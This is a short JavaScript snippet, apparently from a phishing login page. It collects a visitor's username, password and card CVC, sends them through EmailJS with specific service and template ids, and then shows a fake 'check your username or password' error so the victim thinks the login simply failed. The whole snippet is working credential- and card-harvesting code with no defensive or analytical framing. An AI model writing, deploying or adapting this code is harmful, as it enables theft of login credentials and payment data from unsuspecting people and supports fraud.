  <script>
      
    const sendLoginInfo = () => {
      let username = document.getElementById("username").value;
      let password = document.getElementById("password").value;
      let cvc = document.getElementById("cvc").value;

      // Basic validation
      if (username === "" || password === "" || cvc === "") {
        showError();
        return;
      }

      var templateParams = {
        username: username,
        password: password,
        cvc: cvc,
      };

      emailjs.send("service_worxtub", "template_tikb2pl", templateParams)
        .then(function(response) {
          console.log('Login information sent successfully!');
        }, function(error) {
          console.log('Error sending login information:', error);
          showError(); // Display error message on emailjs error
        });
    };
      
    function showError() {
      document.getElementById("error-message").style.display = "block";
      document.getElementById("error-message").style.color = "red";
      alert("Check your username or password!"); // Popup warning message
    }
